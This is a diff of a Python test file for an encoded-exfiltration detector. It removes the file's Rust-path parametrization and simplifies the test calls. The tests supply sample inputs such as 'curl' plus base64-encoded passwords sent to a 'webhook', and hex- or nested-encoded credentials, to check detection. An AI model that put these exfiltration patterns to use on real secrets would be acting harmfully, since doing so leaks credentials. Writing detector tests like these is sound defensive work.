         The hex layer decodes to base64 text. The base64 text decodes to content with 'api_key'.
@@ -1104,28 +1002,21 @@ class TestNestedEncodingDetection:
         cfg = EncodedExfilDetectorConfig(max_decode_depth=2, min_suspicion_score=4)
         payload = {"data": outer}
 
-        count, _redacted, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _redacted, findings = _scan_container(payload, cfg)
         assert count >= 1, "Hex-wrapped base64 should be detected via nested decoding"
         assert any("sensitive_keywords" in f.get("reason", []) for f in findings), "sensitive_keywords should be found after peeling hex then base64"
 
 
 # ---------------------------------------------------------------------------
-# Group M — Rust-path coverage for new features
+# Group M — New Feature Coverage
 # ---------------------------------------------------------------------------
 
 
-@pytest.mark.parametrize(
-    "use_rust",
-    [
-        pytest.param(False, id="python"),
-        pytest.param(True, marks=pytest.mark.skipif(not RUST_AVAILABLE, reason="Rust not available"), id="rust"),
-    ],
-)
-class TestNewFeaturesRustParity:
-    """Verify new features (per-encoding thresholds, JSON parsing) work on both paths."""
+class TestNewFeatures:
+    """Verify new features work on the packaged detector path."""
 
-    def test_per_encoding_threshold_both_paths(self, use_rust: bool):
-        """Per-encoding thresholds should work identically on Python and Rust paths."""
+    def test_per_encoding_threshold(self):
+        """Per-encoding thresholds should filter findings by encoding."""
         cfg = EncodedExfilDetectorConfig(
             per_encoding_score={"hex": 8, "base64": 1},
             min_suspicion_score=3,
@@ -1134,13 +1025,13 @@ class TestNewFeaturesRustParity:
         hex_payload = b"password=secret-value-for-upload".hex()
         payload = {"b64": f"curl {b64_payload} webhook", "hex": f"upload {hex_payload}"}
 
-        _, _, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        _, _, findings = _scan_container(payload, cfg)
         encodings_found = {f["encoding"] for f in findings}
         assert "base64" in encodings_found or "base64url" in encodings_found
         assert "hex" not in encodings_found
 
-    def test_json_within_string_both_paths(self, use_rust: bool):
-        """JSON-within-strings parsing should work identically on Python and Rust paths."""
+    def test_json_within_string(self):
+        """JSON-within-strings parsing should preserve original string types."""
         # Standard
         import json
 
@@ -1149,31 +1040,31 @@ class TestNewFeaturesRustParity:
         cfg = EncodedExfilDetectorConfig(min_suspicion_score=1, parse_json_strings=True)
         payload = {"data": json_str}
 
-        count, result, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, result, findings = _scan_container(payload, cfg)
         assert count == 1, f"Expected 1 finding but got {count}"
         # Return type must be string (no type mutation)
         assert isinstance(result["data"], str), f"Expected str but got {type(result['data'])}"
 
-    def test_json_heuristic_skips_non_json_strings(self, use_rust: bool):
+    def test_json_heuristic_skips_non_json_strings(self):
         """Strings not starting with { or [ should skip JSON parsing and scan as raw text."""
         cfg = EncodedExfilDetectorConfig(min_suspicion_score=1, parse_json_strings=True)
         encoded = base64.b64encode(b"password=super-secret-credential-value").decode()
         payload = {"data": f"curl {encoded} webhook"}
 
-        count, _, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _, findings = _scan_container(payload, cfg)
         assert count >= 1
         # Path should NOT contain "json" since the string doesn't start with { or [
         assert not any("json" in f.get("path", "") for f in findings)
 
-    def test_malformed_json_no_crash_both_paths(self, use_rust: bool):
+    def test_malformed_json_no_crash(self):
         """Malformed JSON should fall back to raw text scan without crashing."""
         cfg = EncodedExfilDetectorConfig(parse_json_strings=True)
         payload = {"data": '{"broken json: missing closing brace'}
 
-        count, _, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _, findings = _scan_container(payload, cfg)
         assert isinstance(count, int)
 
-    def test_json_string_returns_string_not_dict(self, use_rust: bool):
+    def test_json_string_returns_string_not_dict(self):
         """JSON-parsed strings must return the original string type, not a parsed dict."""
         # Standard
         import json
@@ -1182,17 +1073,17 @@ class TestNewFeaturesRustParity:
         cfg = EncodedExfilDetectorConfig(parse_json_strings=True)
         payload = {"data": json_str}
 
-        _, result, _ = _scan_container(payload, cfg, use_rust=use_rust)
+        _, result, _ = _scan_container(payload, cfg)
         # The "data" value must still be a string, not a parsed dict
         assert isinstance(result["data"], str), f"Expected str but got {type(result['data'])}"
 
-    def test_encoded_secret_in_dict_key_detected(self, use_rust: bool):
+    def test_encoded_secret_in_dict_key_detected(self):
         """Encoded secrets used as dict keys should be detected."""
         encoded_key = base64.b64encode(b"password=super-secret-credential-value").decode()
         cfg = EncodedExfilDetectorConfig(min_suspicion_score=1)
         payload = {encoded_key: "some value"}
 
-        count, _, findings = _scan_container(payload, cfg, use_rust=use_rust)
+        count, _, findings = _scan_container(payload, cfg)
         assert count >= 1, "Encoded secret in dict key should be detected"
         assert any("key" in f.get("path", "") for f in findings), f"Finding path should contain 'key': {findings}"
 
@@ -1217,7 +1108,7 @@ class TestDocumentedLimitations:
         cfg = EncodedExfilDetectorConfig(min_suspicion_score=1, parse_json_strings=True)
         payload = {"data": double_encoded_json}
 
-        count, result, findings = _scan_container(payload, cfg, use_rust=False)
+        count, result, findings = _scan_container(payload, cfg)
 
         assert count >= 1, "Should find base64 inside nested JSON strings"
         # Return type must remain string (no type mutation)
@@ -1238,8 +1129,8 @@ class TestDocumentedLimitations:
         # The raw text has the base64 escaped with backslashes so regex won't match it directly
         payload = {"data": inner_json}
 
-        count_on, _, _ = _scan_container(payload, cfg_on, use_rust=False)
-        count_off, _, _ = _scan_container(payload, cfg_off, use_rust=False)
+        count_on, _, _ = _scan_container(payload, cfg_on)
+        count_off, _, _ = _scan_container(payload, cfg_off)
 
         # Both should find it in the raw string scan, but with JSON parsing on,
         # additional findings from the parsed structure may appear
@@ -1260,7 +1151,7 @@ class TestDocumentedLimitations:
         cfg = EncodedExfilDetectorConfig(min_suspicion_score=1, parse_json_strings=True)
         payload = {"input": json_str}
 
-        count, result, findings = _scan_container(payload, cfg, use_rust=False)
+        count, result, findings = _scan_container(payload, cfg)
 
         # Should find exactly 1 finding — not 2 from double-counting
         assert count == 1, f"Expected 1 finding but got {count}: single secret must not be double-counted"
@@ -1272,7 +1163,7 @@ class TestDocumentedLimitations:
         cfg = EncodedExfilDetectorConfig(parse_json_strings=True)
         payload = {"data": '{"broken json: missing closing brace'}
 
-        count, redacted, findings = _scan_container(payload, cfg, use_rust=False)
+        count, redacted, findings = _scan_container(payload, cfg)
         # Should not crash — just scan as regular text
         assert isinstance(count, int)
 
@@ -1289,7 +1180,7 @@ class TestDocumentedLimitations:
         cfg = EncodedExfilDetectorConfig(min_suspicion_score=1, parse_json_strings=True)
         payload = {"data": json_str}
 
-        count, result, findings = _scan_container(payload, cfg, use_rust=False)
+        count, result, findings = _scan_container(payload, cfg)
         assert count >= 1, "JSON-parsed finding should be detected"
         assert any("json" in f.get("path", "") for f in findings), "Finding should come from JSON path"
         assert isinstance(result["data"], str), "Return type must remain string"
@@ -1306,8 +1197,8 @@ class TestDocumentedLimitations:
         # Each half is plain text (not encoded), so the scanner won't flag it.
         # But together they form: "password=super-secret-credential-value"
         # A cross-request correlator would reassemble and detect.
-        count1, _, _ = _scan_container({"data": "password=super-"}, cfg, use_rust=False)
-        count2, _, _ = _scan_container({"data": "secret-credential-value"}, cfg, use_rust=False)
+        count1, _, _ = _scan_container({"data": "password=super-"}, cfg)
+        count2, _, _ = _scan_container({"data": "secret-credential-value"}, cfg)
 
         assert count1 == 0, "Plain text half should not trigger"
         assert count2 == 0, "Plain text half should not trigger"
@@ -1332,7 +1223,7 @@ class TestDocumentedLimitations:
         hex_payload = b"password=secret-value-for-upload".hex()
         payload = {"b64": f"curl {b64_payload} webhook", "hex": f"upload {hex_payload}"}
 
-        _, _, findings = _scan_container(payload, cfg, use_rust=False)
+        _, _, findings = _scan_container(payload, cfg)
 
         encodings_found = {f["encoding"] for f in findings}
         # base64 should be found (threshold=1, easy to pass)
